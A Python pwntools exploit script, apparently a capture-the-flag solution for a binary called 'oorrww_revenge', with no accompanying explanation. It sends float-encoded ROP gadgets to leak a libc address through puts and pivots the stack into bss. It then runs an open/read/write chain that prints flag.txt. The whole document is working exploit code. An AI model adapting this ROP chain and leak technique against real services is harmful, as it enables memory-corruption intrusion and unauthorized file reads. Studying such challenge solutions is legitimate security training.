from pwn import *
import struct

# r = process("./oorrww_revenge")
r = remote("localhost", 9998)
e = ELF("oorrww_revenge")
libc = ELF("./libc.so.6")

def float_str_to_int(str):
    return u64(struct.pack("<d", float(str)))

def int_to_float_str(num):
    return (str(struct.unpack("<d", p64(num))).encode("ascii"))[1:-2]

pop_rax = 0x401203
mov_rdi_rax_puts = 0x4012da
puts_got = 0x403fc8
# main = 0x4012e5
main = e.symbols["main"]
ret = 0x40101a

payload = []

payload.append(pop_rax)
payload.append(puts_got)
payload.append(mov_rdi_rax_puts)
payload.append(0)
payload.append(ret)
payload.append(main)

for i in range(21):
    r.sendlineafter(b"input:\n", b".")

for i in range(6):
    r.sendlineafter(b"input:\n", int_to_float_str(payload[i]))

for i in range(3):
    r.sendlineafter(b"input:\n", b".")

libc_base = u64(r.recvline()[:-1].ljust(8, b"\x00")) - libc.symbols["puts"]

print("libc_base: ", hex(libc_base))

pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x00000000000904a9
leave_ret = 0x4012c9

# bss = 0x404800
bss = e.bss()

payload = []

payload.append(pop_rdi)
payload.append(0)
payload.append(pop_rsi)
payload.append(bss)
payload.append(pop_rdx_rbx)
payload.append(0x100)
payload.append(0)
payload.append(libc_base + libc.symbols['read'])
payload.append(leave_ret)

for i in range(20):
    r.sendlineafter(b"input:\n", b".")

r.sendlineafter(b"input:\n", int_to_float_str(bss - 8))

for i in range(9):
    r.sendlineafter(b"input:\n", int_to_float_str(payload[i]))

payload = p64(pop_rdi)
payload += p64(bss + 0x80)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(libc_base + libc.symbols["open"])
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(0x404c00)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(libc_base + libc.symbols["read"])
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(libc_base + libc.symbols["write"])
payload += b"./flag.txt\x00"

r.send(payload)

r.interactive()